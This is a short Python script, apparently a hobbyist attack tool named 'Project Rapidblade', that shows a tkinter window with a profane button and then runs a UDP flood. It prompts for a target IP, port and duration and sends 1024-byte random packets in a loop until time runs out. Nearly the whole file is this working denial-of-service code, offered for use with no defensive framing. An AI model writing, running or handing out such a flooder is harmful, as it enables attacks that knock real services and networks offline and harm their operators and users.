import os
import sys
import time
import socket
import random

from tkinter import *
import tkinter.ttk as ttk

# Following will import tkinter.ttk module and 
# automatically override all the widgets 
# which are present in tkinter module. 
from tkinter.ttk import *
 
# Create Object
root = Tk() 
 
# Initialize tkinter window with dimensions 100x100             
root.geometry('500x500')     
 
btn = Button(root, text = 'fuck them hard !', 
                command = root.destroy) 
 
# Set the position of button on the top of window 
btn.pack(side = 'top')     

root.mainloop()

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024)

os.system("clear")
print("Project Rapidblade")
print("")
ip = input("Enter target ip : ")
port = int(input("Enter target port : "))
dur = int(input("Enter duration : "))
timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print("Sent",sent,"packets to",ip,"through",port,)
    except KeyboardInterrupt:
        sys.exit()
